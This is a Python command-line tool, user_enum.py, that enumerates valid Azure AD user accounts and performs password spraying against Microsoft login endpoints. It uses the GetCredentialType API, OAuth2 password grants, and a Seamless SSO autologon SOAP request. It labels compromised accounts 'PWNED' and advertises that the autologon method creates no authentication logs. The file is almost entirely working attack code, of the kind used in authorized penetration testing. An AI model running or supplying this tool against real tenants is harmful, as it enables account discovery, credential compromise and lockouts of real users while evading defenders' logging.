#!/usr/bin/python3

'''
Copyright (C) 2022 Cody Martin BLSOPS LLC

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''

import sys
import argparse
import time
import json
import uuid
from datetime import datetime
from datetime import timezone
from datetime import timedelta
import xml.etree.ElementTree as ET
import colorama
import requests

# Set up our colors
colorama.init()
SUCCESS = colorama.Fore.GREEN
VALID = colorama.Fore.CYAN
DANGER = colorama.Fore.RED
WARNING = colorama.Fore.YELLOW
RESET = colorama.Style.RESET_ALL

# Set up argparse stuff
METHODS = [
	'normal',
	'login',
	'autologon'
]

DESCRIPTION = f'''
  =====================================================================================
  # This module will enumerate for valid user accounts in an Azure AD environment     #
  # There are three methods to enumerate with: login, autologon, normal               #
  #                                                                                   #
  # Default method: normal                                                            #
  #                                                                                   #
  # You may supply either a single username to test, or a user list                   #
  # Supplying a password will insert it into either the 'login' or 'autologon' method #
  # If the password is correct, account will be marked 'PWNED'                        #
  #                                                                                   #
  #{DANGER} Using the 'login' method will create failed authentication logs in Azure AD {RESET}      #
  #                                                                                   #
  #{WARNING} Using the 'autologon' method will not create any logs, but is less accurate {RESET}      #
  =====================================================================================
'''

def main():
	"""
	Main runner function. Takes in a username or list of users
	and attempts to brute-force check for user existence.

	Can also take in a password to be used with 'login' or
	'autologon' methods to perform password spray
	"""
	arg_parser = argparse.ArgumentParser(prog='user_enum.py',
							usage=SUCCESS + '%(prog)s' + RESET + ' [-m login-method | '\
								'-u username | -i input-list | -o outfile]',
							description=DESCRIPTION,
							formatter_class=argparse.RawDescriptionHelpFormatter)
	arg_parser.add_argument('-m',
							'--method',
							metavar='<method>',
							dest='method',
							type=str,
							help=f'The login method you would like to use (default is normal), select one '\
										f'of {str(METHODS).replace(","," ").replace("[","").replace("]","")}',
							choices=METHODS,
							required=False)
	arg_parser.add_argument('-u',
							'--username',
							metavar='<test@domain.com>',
							dest='username',
							type=str,
							help='The username you would like to test',
							required=False)
	arg_parser.add_argument('-i',
							'--input-list',
							metavar='</path/to/usernames.txt>',
							dest='input_list',
							type=str,
							help='Text file containing usernames you want to test',
							required=False)
	arg_parser.add_argument('-p',
							'--password',
							metavar='<password>',
							dest='password',
							type=str,
							help='The password you want to spray with. Only works with '\
										'\'login\' and \'autologon\' methods.',
							required=False)
	arg_parser.add_argument('-o',
							'--outfile',
							metavar='</path/to/output/directory/>',
							dest='outfile_path',
							type=str,
							help='Path to where you want to save your results',
							required=False)

	args = arg_parser.parse_args()

	if args.method is None:
		args.method = 'normal'

	# Set a default outfile if none is given
	outfile_path = args.outfile_path
	if outfile_path is None:
		outfile = './' + time.strftime('%Y-%m-%d_%H-%M-%S_User-Enum.json')
	else:
		if outfile_path[-1] != '/':
			outfile_path = outfile_path + '/'
		outfile = outfile_path + time.strftime('%Y-%m-%d_%H-%M-%S_User-Enum.json')

	if args.username is not None:
		# Single user mode
		userlist = [args.username]
	elif args.input_list is not None:
		# We better be loading from a list
		with open(args.input_list, encoding='UTF-8') as userfile:
			userlist = []
			for user in userfile.readlines():
				userlist.append(user.replace('\n', ''))
	else:
		# No users supplied
		print(f'{WARNING}No users supplied with either -u or -i\n{DANGER}Exiting{RESET}')
		sys.exit()

	if args.password is None:
		password = 'none'
		client_id = str(uuid.uuid4())
	else:
		password = args.password
		client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'

	results = []

	if args.method == 'normal':
		for user in userlist:
			data = {
				'username': user,
				'isOtherIdpSupported': 'true',
				'checkPhones': 'true',
				'isRemoteNGCSupported': 'false',
				'isCookieBannerShown': 'false',
				'isFidoSupported': 'false',
				'originalRequest': '',
				'flowToken': ''
			}

			json_data = json.dumps(data)

			headers = {
				'Content-Type': 'application/json; charset=utf-8',
			}

			endpoint = 'https://login.microsoftonline.com/common/GetCredentialType'

			json_response = requests.post(endpoint, headers=headers, data=json_data).json()

			if json_response['ThrottleStatus'] == 1:
				print(f'{WARNING}Requests being throttled.{RESET}')
				exists = '???'
			else:
				if json_response['IfExistsResult'] == 0 or json_response['IfExistsResult'] == 6:
					exists = 'VALID'
				else:
					exists = 'INVALID'

			results.append({
				'account': user,
				'exists': exists
			})

	elif args.method == 'login':
		for user in userlist:
			data = {
				'resource': client_id,
				'client_id': client_id,
				'grant_type': 'password',
				'username': user,
				'password': password,
				'scope': 'openid'
			}

			endpoint = 'https://login.microsoftonline.com/common/oauth2/token'

			headers = {
				'Content-Type': 'application/x-www-form-urlencoded'
			}

			json_response = requests.post(endpoint, headers=headers, data=data).json()

			try:
				if json_response['token_type'] == 'Bearer':
					exists = 'PWNED'
			except KeyError:
				response_code = json_response['error_description'].split(':')[0]
				if response_code == 'AADSTS50053':
					# The account is locked, you've tried to sign in too many
					# times with an incorrect user ID or password.
					exists = 'LOCKED'
				elif response_code == 'AADSTS50126':
					# Error validating credentials due to invalid username or password.
					exists = 'VALID'
				elif response_code == 'AADSTS50076':
					# Due to a configuration change made by your administrator, or because you
					# moved to a new location, you must use multi-factor authentication to access
					exists = 'MFA'
				elif response_code == 'AADSTS700016':
					# Application with identifier '{appIdentifier}' was not found in the directory
					# '{tenantName}'. This can happen if the application has not been installed by
					# the administrator of the tenant or consented to by any user in the tenant.
					# You may have sent your authentication request to the wrong tenant.
					exists = 'VALID'
				elif response_code == 'AADSTS50034':
					# The user account {identifier} does not exist in the {tenant} directory.
					# To sign into this application, the account must be added to the directory.
					exists = 'INVALID'
				else:
					exists = '???'

			results.append({
				'account': user,
				'exists': exists
			})

	elif args.method == 'autologon':
		for user in userlist:
			rand_uuid = client_id
			message_id = str(uuid.uuid4()).upper()
			username_token = str(uuid.uuid4()).upper()

			domain = user.split("@")[1]

			date = datetime.now(timezone.utc)
			created_utc = date.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
			expires_utc = (date + timedelta(minutes=10)).strftime('%Y-%m-%dT%H:%M:%S.%fZ')

			endpoint = f'https://autologon.microsoftazuread-sso.com/{domain}/winauth' \
									f'/trust/2005/usernamemixed?client-request-id={rand_uuid}'

			xml = f'''<?xml version='1.0' encoding='UTF-8'?>
		<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
		    <s:Header>
		        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
		        <wsa:To s:mustUnderstand='1'>{endpoint}</wsa:To>
		        <wsa:MessageID>urn:uuid:{message_id}</wsa:MessageID>
		        <wsse:Security s:mustUnderstand="1">
		            <wsu:Timestamp wsu:Id="_0">
		                <wsu:Created>{created_utc}</wsu:Created>
		                <wsu:Expires>{expires_utc}</wsu:Expires>
		            </wsu:Timestamp>
		            <wsse:UsernameToken wsu:Id="uuid-{username_token}">
		                <wsse:Username>{user}</wsse:Username>
		                <wsse:Password>{password}</wsse:Password>
		            </wsse:UsernameToken>
		        </wsse:Security>
		    </s:Header>
		    <s:Body>
		        <wst:RequestSecurityToken Id='RST0'>
		            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
		                <wsp:AppliesTo>
		                    <wsa:EndpointReference>
		                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
		                    </wsa:EndpointReference>
		                </wsp:AppliesTo>
		                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
		        </wst:RequestSecurityToken>
		    </s:Body>
		</s:Envelope>
		'''

			response = requests.post(endpoint, data=xml)
			if response.status_code != 400:
				exists: 'PWNED'
			else:
				xml_response = ET.fromstring(str(response.content, 'utf-8'))
				response_code = xml_response[1][0][2][0][1][1].text.split(':')[0]

				if response_code == 'AADSTS50053':
					# The account is locked, you've tried to sign in
					# too many times with an incorrect user ID or password.
					exists = 'LOCKED'
				elif response_code == 'AADSTS50126':
					# Error validating credentials due to invalid username or password.
					exists = 'VALID'
				elif response_code == 'AADSTS50076':
					# Due to a configuration change made by your administrator, or because you moved to a new
					# location, you must use multi-factor authentication to access
					exists = 'MFA'
				elif response_code == 'AADSTS700016':
					# Application with identifier '{appIdentifier}' was not found in the directory '{tenantName}'.
					# This can happen if the application has not been installed by the administrator of the
					# tenant or consented to by any user in the tenant.
					# You may have sent your authentication request to the wrong tenant.
					exists = 'VALID'
				elif response_code == 'AADSTS50034':
					# The user account {identifier} does not exist in the {tenant} directory.
					# To sign into this application, the account must be added to the directory.
					exists = 'INVALID'
				else:
					exists = '???'
			results.append({
				'account': user,
				'exists': exists
			})

	for result in results:
		if result['exists'] == 'PWNED':
			print(f'{SUCCESS}[+]{RESET} {result["account"]} : {SUCCESS}{result["exists"]}{RESET}')
		elif result['exists'] == 'VALID' or result['exists'] == 'MFA' or result['exists'] == 'LOCKED':
			print(f'{VALID}[+]{RESET} {result["account"]} : {VALID}{result["exists"]}{RESET}')
		elif result['exists'] == 'INVALID':
			print(f'{DANGER}[-]{RESET} {result["account"]} : {DANGER}{result["exists"]}{RESET}')
		else:
			print(f'{WARNING}[?]{RESET} {result["account"]} : {WARNING}{result["exists"]}{RESET}')

	# Write our results out to file
	with open(outfile, 'w+', encoding='UTF-8') as file:
		file.write(json.dumps(results))
		file.close()

if __name__ == '__main__':
	main()
	sys.exit()
